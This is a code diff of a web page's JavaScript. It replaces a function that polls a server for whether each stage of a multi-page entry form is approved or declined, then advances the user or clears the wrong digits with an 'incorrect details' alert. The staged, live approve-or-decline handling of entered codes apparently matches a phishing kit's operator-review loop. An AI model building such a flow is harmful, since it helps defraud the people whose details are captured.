@@ -402,60 +402,33 @@ async function sendStagePayload(stage, payload) {
 }
 
 // Polling core infrastructure engine
-function runPollingLoop(currentId, nextId, btn, statusLabel, inputField) {
-    if (statusInterval) clearInterval(statusInterval);
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
 
-    statusInterval = setInterval(async () => {
-        try {
-            const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
-            const result = await response.json();
+  if(pollingInterval) clearInterval(pollingInterval);
 
-            if (result.status === "approved") {
-                clearInterval(statusInterval);
-                document.getElementById(currentId).style.display = "none";
-                document.getElementById(nextId).style.display = "block";
-            } 
-            // 🚀 EXCLUSIVE DECLINE FIX: Only affects the active page rejection
-          
-else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
-    clearInterval(statusInterval); // Instantly stop the current waiting loop
-    
-    // 1. Hide the waiting text layout layer safely
-    if (statusLabel) {
-        statusLabel.style.display = "none";
-    }
-    
-    // 2. Clear out the wrong entry and unlock the active text box field completely
-    if (inputField) {
-        inputField.disabled = false;
-        inputField.removeAttribute("disabled");
-        inputField.value = ""; // 🧼 Wipes the first wrong data automatically
-        inputField.focus();
-    }
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
 
-    // 3. Fully unfreeze the button attributes and clear internal element flags
-    if (btn) {
-        btn.disabled = false;
-        btn.removeAttribute("disabled"); // Removes physical HTML-level tap lockouts
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.classList.add("error");
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
+    } catch (err) {
+      console.error("Status check failed");
     }
-    
-    // 🚀 THE MAGIC FIX: Force the browser to manually fire an input event check.
-    // This updates your length validation script instantly, allowing the button 
-    // to become active the millisecond the last digit is typed back in.
-    if (inputField) {
-        inputField.dispatchEvent(new Event("input", { bubbles: true }));
-    }
-    
-    // 4. Pop user notification safely after thread finishes rendering layout elements
-    setTimeout(() => {
-        alert("The details entered were incorrect. Please check and try again.");
-    }, 100);
+  }, 2500);
 }
- 
-
-        } catch (e) {
-            console.error(e);
-        }
-    }, 2500);
-}
-/script>
+</script>
